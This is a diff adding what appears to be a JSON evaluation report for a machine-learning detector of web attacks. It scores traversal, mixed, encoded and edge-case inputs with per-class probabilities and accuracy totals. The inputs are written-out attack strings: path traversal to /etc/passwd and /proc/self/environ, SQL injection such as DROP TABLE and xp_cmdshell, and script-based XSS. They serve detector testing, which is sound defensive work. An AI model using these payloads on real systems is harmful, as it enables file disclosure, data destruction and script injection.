+              "xss": 0.0013360017910599709,
+              "traversal": 0.008877254091203213
+            },
+            "total_inference_time_ms": 88.61351013183594
+          }
+        },
+        {
+          "input": "....//....//....//etc//passwd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9288115501403809,
+            "binary_probability": 0.9288115501403809,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9999860525131226,
+            "class_probabilities": {
+              "sqli": 2.3171815577427424e-09,
+              "commandi": 1.055262782756472e-05,
+              "xss": 3.399363095013541e-06,
+              "traversal": 0.9999860525131226
+            },
+            "total_inference_time_ms": 99.15494918823242
+          }
+        },
+        {
+          "input": "..%2f..%2f..%2fetc%2fpasswd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9374408721923828,
+            "binary_probability": 0.9374408721923828,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9999998807907104,
+            "class_probabilities": {
+              "sqli": 7.766103038431282e-11,
+              "commandi": 1.0849517195765657e-07,
+              "xss": 3.2117696946443175e-08,
+              "traversal": 0.9999998807907104
+            },
+            "total_inference_time_ms": 92.41437911987305
+          }
+        },
+        {
+          "input": "..\\..\\..\\etc\\passwd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9250773787498474,
+            "binary_probability": 0.9250773787498474,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9999334812164307,
+            "class_probabilities": {
+              "sqli": 3.160620209996523e-08,
+              "commandi": 4.522345989244059e-05,
+              "xss": 2.1203168216743506e-05,
+              "traversal": 0.9999334812164307
+            },
+            "total_inference_time_ms": 83.22858810424805
+          }
+        },
+        {
+          "input": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9529346823692322,
+            "binary_probability": 0.9529346823692322,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9999997615814209,
+            "class_probabilities": {
+              "sqli": 3.380577762168713e-10,
+              "commandi": 1.2160520590498436e-08,
+              "xss": 2.0186651283893298e-07,
+              "traversal": 0.9999997615814209
+            },
+            "total_inference_time_ms": 89.18046951293945
+          }
+        },
+        {
+          "input": "....\\....\\....\\windows\\system32",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9403619766235352,
+            "binary_probability": 0.9403619766235352,
+            "attack_type": "traversal",
+            "attack_confidence": 0.999962329864502,
+            "class_probabilities": {
+              "sqli": 7.720409200828726e-08,
+              "commandi": 3.3194348361575976e-05,
+              "xss": 4.361041646916419e-06,
+              "traversal": 0.999962329864502
+            },
+            "total_inference_time_ms": 102.15425491333008
+          }
+        },
+        {
+          "input": "file:///etc/passwd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9007279276847839,
+            "binary_probability": 0.9007279276847839,
+            "attack_type": "commandi",
+            "attack_confidence": 0.8115108609199524,
+            "class_probabilities": {
+              "sqli": 8.965557208284736e-05,
+              "commandi": 0.8115108609199524,
+              "xss": 0.001448723953217268,
+              "traversal": 0.18695083260536194
+            },
+            "total_inference_time_ms": 148.80013465881348
+          }
+        },
+        {
+          "input": "../../../../../proc/self/environ",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8975006341934204,
+            "binary_probability": 0.8975006341934204,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9958872199058533,
+            "class_probabilities": {
+              "sqli": 2.747278671222375e-08,
+              "commandi": 0.003575484734028578,
+              "xss": 0.0005372933228500187,
+              "traversal": 0.9958872199058533
+            },
+            "total_inference_time_ms": 125.2586841583252
+          }
+        },
+        {
+          "input": "\\..\\..\\..\\etc\\passwd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9527249336242676,
+            "binary_probability": 0.9527249336242676,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9999954700469971,
+            "class_probabilities": {
+              "sqli": 6.132908625389177e-10,
+              "commandi": 1.5301510529752704e-06,
+              "xss": 2.9590930807898985e-06,
+              "traversal": 0.9999954700469971
+            },
+            "total_inference_time_ms": 109.27534103393555
+          }
+        },
+        {
+          "input": "..%5c..%5c..%5cwindows%5csystem32",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9381810426712036,
+            "binary_probability": 0.9381810426712036,
+            "attack_type": "traversal",
+            "attack_confidence": 0.999997615814209,
+            "class_probabilities": {
+              "sqli": 6.813386477233507e-08,
+              "commandi": 1.6129822597577004e-06,
+              "xss": 7.239175374706974e-07,
+              "traversal": 0.999997615814209
+            },
+            "total_inference_time_ms": 113.01374435424805
+          }
+        }
+      ],
+      "accuracy": 100.0,
+      "correct": 12,
+      "total": 12
+    },
+    "mixed_attacks": {
+      "results": [
+        {
+          "input": "'; DROP TABLE users; -- <script>alert('xss')</script>",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.7912722826004028,
+            "binary_probability": 0.7912722826004028,
+            "attack_type": "xss",
+            "attack_confidence": 0.9890779852867126,
+            "class_probabilities": {
+              "sqli": 2.8897455194965005e-05,
+              "commandi": 0.010890129953622818,
+              "xss": 0.9890779852867126,
+              "traversal": 2.8940739866811782e-06
+            },
+            "total_inference_time_ms": 145.76244354248047
+          }
+        },
+        {
+          "input": "admin'; EXEC xp_cmdshell('whoami'); --",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.7855077981948853,
+            "binary_probability": 0.7855077981948853,
+            "attack_type": "commandi",
+            "attack_confidence": 0.7567163705825806,
+            "class_probabilities": {
+              "sqli": 0.2427697777748108,
+              "commandi": 0.7567163705825806,
+              "xss": 0.000509881938342005,
+              "traversal": 3.995290626335191e-06
+            },
+            "total_inference_time_ms": 128.82137298583984
+          }
+        },
+        {
+          "input": "<img src='../../../etc/passwd' onerror='alert(1)'>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9771108627319336,
+            "binary_probability": 0.9771108627319336,
+            "attack_type": "xss",
+            "attack_confidence": 0.9995112419128418,
+            "class_probabilities": {
+              "sqli": 7.893414476711769e-06,
+              "commandi": 0.0004801521135959774,
+              "xss": 0.9995112419128418,
+              "traversal": 7.456444564013509e-07
+            },
+            "total_inference_time_ms": 125.82111358642578
+          }
+        },
+        {
+          "input": "file=../../../etc/passwd&cmd=cat",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9198479056358337,
+            "binary_probability": 0.9198479056358337,
+            "attack_type": "xss",
+            "attack_confidence": 0.6526458263397217,
+            "class_probabilities": {
+              "sqli": 3.7556004826910794e-05,
+              "commandi": 0.16529446840286255,
+              "xss": 0.6526458263397217,
+              "traversal": 0.18202215433120728
+            },
+            "total_inference_time_ms": 114.92109298706055
+          }
+        }
+      ],
+      "accuracy": 100.0,
+      "correct": 4,
+      "total": 4
+    },
+    "encoded_attacks": {
+      "results": [
+        {
+          "input": "%27%20OR%20%271%27%3D%271",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9105349183082581,
+            "binary_probability": 0.9105349183082581,
+            "attack_type": "traversal",
+            "attack_confidence": 0.8386070132255554,
+            "class_probabilities": {
+              "sqli": 0.00028394770924933255,
+              "commandi": 0.00013063568621873856,
+              "xss": 0.16097833216190338,
+              "traversal": 0.8386070132255554
+            },
+            "total_inference_time_ms": 129.9748420715332
+          }
+        },
+        {
+          "input": "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9333007335662842,
+            "binary_probability": 0.9333007335662842,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999990463256836,
+            "class_probabilities": {
+              "sqli": 4.8557367904322746e-08,
+              "commandi": 2.382242456633321e-07,
+              "xss": 0.9999990463256836,
+              "traversal": 7.033482347651443e-07
+            },
+            "total_inference_time_ms": 130.98835945129395
+          }
+        },
+        {
+          "input": "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9897574186325073,
+            "binary_probability": 0.9897574186325073,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999997615814209,
+            "class_probabilities": {
+              "sqli": 4.05038029782645e-08,
+              "commandi": 1.498701607260955e-07,
+              "xss": 0.9999997615814209,
+              "traversal": 6.364545002135458e-10
+            },
+            "total_inference_time_ms": 231.23669624328613
+          }
+        },
+        {
+          "input": "\\x3cscript\\x3ealert(\\x27XSS\\x27)\\x3c/script\\x3e",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9806210398674011,
+            "binary_probability": 0.9806210398674011,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999986886978149,
+            "class_probabilities": {
+              "sqli": 9.388930379827798e-07,
+              "commandi": 2.981868760798534e-07,
+              "xss": 0.9999986886978149,
+              "traversal": 6.107836014734858e-08
+            },
+            "total_inference_time_ms": 139.59074020385742
+          }
+        }
+      ],
+      "accuracy": 100.0,
+      "correct": 4,
+      "total": 4
+    },
+    "edge_cases": {
+      "results": [
+        {
+          "input": "",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": NaN,
+            "binary_probability": NaN,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 118.28351020812988
+          }
+        },
+        {
+          "input": "   ",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": true,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.778933048248291,
+            "binary_probability": 0.778933048248291,
+            "attack_type": "commandi",
+            "attack_confidence": 0.825197160243988,
+            "class_probabilities": {
+              "sqli": 0.06790316104888916,
+              "commandi": 0.825197160243988,
+              "xss": 0.10675809532403946,
+              "traversal": 0.0001415618316968903
+            },
+            "total_inference_time_ms": 157.43637084960938
+          }
+        },
+        {
+          "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": true,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9999949932098389,
+            "binary_probability": 0.9999949932098389,
+            "attack_type": "traversal",
+            "attack_confidence": 0.8393818140029907,
+            "class_probabilities": {
+              "sqli": 0.15423016250133514,
+              "commandi": 0.0003813561634160578,
+              "xss": 0.006006639450788498,
+              "traversal": 0.8393818140029907
+            },
+            "total_inference_time_ms": 141.98565483093262
+          }
+        },
+        {
+          "input": "''''''''''''''''''''''''''''''''''''''''''''''''''",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9989894032478333,
+            "binary_probability": 0.9989894032478333,
+            "attack_type": "sqli",
+            "attack_confidence": 0.8985421657562256,
+            "class_probabilities": {
+              "sqli": 0.8985421657562256,
+              "commandi": 0.003345291595906019,
+              "xss": 0.09807345271110535,
+              "traversal": 3.9060061681084335e-05
+            },
+            "total_inference_time_ms": 128.84116172790527
+          }
+        },
+        {
+          "input": "<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.7351053953170776,
+            "binary_probability": 0.7351053953170776,
+            "attack_type": "xss",
+            "attack_confidence": 1.0,
+            "class_probabilities": {
+              "sqli": 8.912284243933755e-09,
+              "commandi": 4.993277347153935e-09,
+              "xss": 1.0,
+              "traversal": 9.171736259361296e-09
+            },
+            "total_inference_time_ms": 124.99785423278809
+          }
+        },
+        {
+          "input": "SELECT                                                                                                    * FROM users",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.6195020079612732,
+            "binary_probability": 0.3804979920387268,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 65.01221656799316
+          }
+        },
+        {
+          "input": "\n\r\t\u0000",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": true,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.6208803653717041,
+            "binary_probability": 0.6208803653717041,
+            "attack_type": "commandi",
+            "attack_confidence": 0.5086971521377563,
+            "class_probabilities": {
+              "sqli": 0.003548698266968131,
+              "commandi": 0.5086971521377563,
+              "xss": 0.48774266242980957,
+              "traversal": 1.1499948413984384e-05
+            },
+            "total_inference_time_ms": 118.2253360748291
+          }
+        },
+        {
+          "input": "\ud83d\ude80\ud83d\udcbb\ud83d\udd12SQL injection test",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.7894968390464783,
+            "binary_probability": 0.21050316095352173,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 74.70846176147461
+          }
+        }
+      ],
+      "accuracy": 37.5,
+      "correct": 3,
+      "total": 8
+    }
+  },
+  "summary": {
+    "total_tests": 81,
+    "correct_predictions": 67,
+    "overall_accuracy": 82.71604938271605,
+    "average_inference_time_ms": 116.02937733685529,
+    "total_time_seconds": 9.398379564285278
+  }
+}
